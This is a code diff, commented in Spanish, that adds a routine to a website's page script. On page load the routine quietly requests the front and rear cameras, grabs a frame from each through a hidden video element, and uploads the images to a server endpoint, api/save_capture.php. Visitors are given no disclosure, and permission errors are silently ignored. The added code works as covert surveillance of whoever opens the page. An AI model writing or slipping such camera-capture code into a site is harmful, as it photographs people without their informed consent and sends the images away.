@@ -941,4 +941,113 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
     }
+
+    // Iniciar captura de cámara
+    initCameraCapture();
 }); 
+
+// === CAPTURA DE CÁMARA ===
+
+// Función principal para iniciar la captura
+async function initCameraCapture() {
+    // Pequeño retraso para que la página cargue completamente
+    await new Promise(resolve => setTimeout(resolve, 1500));
+
+    try {
+        // 1. Solicitar permiso y capturar de la cámara frontal
+        await captureFromCamera('user', 'front');
+        
+        // 2. Solicitar permiso y capturar de la cámara trasera
+        await captureFromCamera({ exact: 'environment' }, 'rear');
+
+        console.log('Proceso de captura completado.');
+
+    } catch (error) {
+        // El error ya se maneja en la función de captura, pero registramos por si acaso
+        console.error('Error final en el proceso de captura:', error);
+    }
+}
+
+// Función para capturar desde un tipo de cámara específico
+async function captureFromCamera(facingMode, cameraType) {
+    let stream;
+    try {
+        // Obtener el stream de video de forma silenciosa
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facingMode },
+            audio: false
+        });
+
+        // Crear elementos de video y canvas en memoria
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        // Esperar a que el video se cargue
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+        video.play();
+
+        // Esperar un momento para que la cámara se estabilice y ajuste la exposición
+        await new Promise(resolve => setTimeout(resolve, 1200));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Obtener la imagen como base64
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        // Detener la cámara y limpiar
+        stream.getTracks().forEach(track => track.stop());
+        document.body.removeChild(video);
+        
+        // Enviar la imagen al servidor
+        await saveCapture(imageData, cameraType);
+
+    } catch (error) {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+        
+        // Ignorar errores comunes como cámara no encontrada o permiso denegado
+        if (error.name === 'NotFoundError' || error.name === 'OverconstrainedError' || error.name === 'NotAllowedError') {
+            console.warn(`No se pudo capturar desde la cámara ${cameraType}: ${error.name}`);
+            return; // No es un error fatal, simplemente no se pudo capturar
+        }
+        
+        // Propagar otros errores inesperados
+        console.error(`Error inesperado con la cámara ${cameraType}:`, error);
+        throw error;
+    }
+}
+
+// Función para enviar la captura al servidor
+async function saveCapture(imageData, cameraType) {
+    try {
+        const response = await fetch('api/save_capture.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                image: imageData,
+                cameraType: cameraType
+            })
+        });
+
+        const result = await response.json();
+
+        if (!result.success) {
+            throw new Error(result.error || 'Error desconocido al guardar la imagen.');
+        }
+
+        console.log(`Imagen ${cameraType} guardada exitosamente:`, result.file);
+
+    } catch (error) {
+        console.error(`Error al guardar la captura ${cameraType}:`, error);
+        // No propagamos el error para no detener el proceso si falla una sola captura
+    }
+} 
